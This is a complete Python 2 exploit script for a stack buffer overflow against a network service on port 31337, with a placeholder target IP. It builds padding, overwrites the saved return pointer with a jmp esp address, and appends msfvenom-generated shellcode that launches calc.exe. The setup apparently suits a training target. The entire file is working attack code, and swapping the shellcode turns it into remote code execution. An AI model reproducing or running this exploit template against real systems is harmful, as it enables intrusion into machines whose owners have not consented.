#!/usr/bin/env python2
import socket
import struct
# configure the IP and port we're connecting to
RHOST = "<target-ip-here>"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# Specify buffer length and the saved return pointer offset
buf_totlen = 1024
offset_srp = 146


ptr_jmp_esp = 0x080414C3 # memory address of jmp esp
sub_esp_10 = "\x83\xec\x10" # assembly code to subtract esp by 16 bytes to move it "up" the stack

# shellcode creation: msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
shellcode_calc =  ""
shellcode_calc += "\xbd\x43\x76\x9c\x19\xdb\xda\xd9\x74\x24"
shellcode_calc += "\xf4\x5a\x29\xc9\xb1\x31\x31\x6a\x13\x83"
shellcode_calc += "\xea\xfc\x03\x6a\x4c\x94\x69\xe5\xba\xda"
shellcode_calc += "\x92\x16\x3a\xbb\x1b\xf3\x0b\xfb\x78\x77"
shellcode_calc += "\x3b\xcb\x0b\xd5\xb7\xa0\x5e\xce\x4c\xc4"
shellcode_calc += "\x76\xe1\xe5\x63\xa1\xcc\xf6\xd8\x91\x4f"
shellcode_calc += "\x74\x23\xc6\xaf\x45\xec\x1b\xb1\x82\x11"
shellcode_calc += "\xd1\xe3\x5b\x5d\x44\x14\xe8\x2b\x55\x9f"
shellcode_calc += "\xa2\xba\xdd\x7c\x72\xbc\xcc\xd2\x09\xe7"
shellcode_calc += "\xce\xd5\xde\x93\x46\xce\x03\x99\x11\x65"
shellcode_calc += "\xf7\x55\xa0\xaf\xc6\x96\x0f\x8e\xe7\x64"
shellcode_calc += "\x51\xd6\xcf\x96\x24\x2e\x2c\x2a\x3f\xf5"
shellcode_calc += "\x4f\xf0\xca\xee\xf7\x73\x6c\xcb\x06\x57"
shellcode_calc += "\xeb\x98\x04\x1c\x7f\xc6\x08\xa3\xac\x7c"
shellcode_calc += "\x34\x28\x53\x53\xbd\x6a\x70\x77\xe6\x29"
shellcode_calc += "\x19\x2e\x42\x9f\x26\x30\x2d\x40\x83\x3a"
shellcode_calc += "\xc3\x95\xbe\x60\x89\x68\x4c\x1f\xff\x6b"
shellcode_calc += "\x4e\x20\xaf\x03\x7f\xab\x20\x53\x80\x7e"
shellcode_calc += "\x05\xbb\x62\xab\x73\x54\x3b\x3e\x3e\x39"
shellcode_calc += "\xbc\x94\x7c\x44\x3f\x1d\xfc\xb3\x5f\x54"
shellcode_calc += "\xf9\xf8\xe7\x84\x73\x90\x8d\xaa\x20\x91"
shellcode_calc += "\x87\xc8\xa7\x01\x4b\x21\x42\xa2\xee\x3d"


# buffer creation
buf = ""
buf += "A" * (offset_srp - len(buf))	# padding
buf += struct.pack("<I", ptr_jmp_esp)	# overwriting the saved return pointer with the memory address of the jmp esp instruction
buf += sub_esp_10			# ESP points to here, and will be subtracted by 16 bytes
buf += shellcode_calc			# shellcode to open up the calculator app on Windows
buf += "D" * (buf_totlen - len(buf))	# trailing padding
buf += "\n"

# send a message down the socket
s.send(buf)

# print out what we sent
print("Sent: {0}".format(buf))
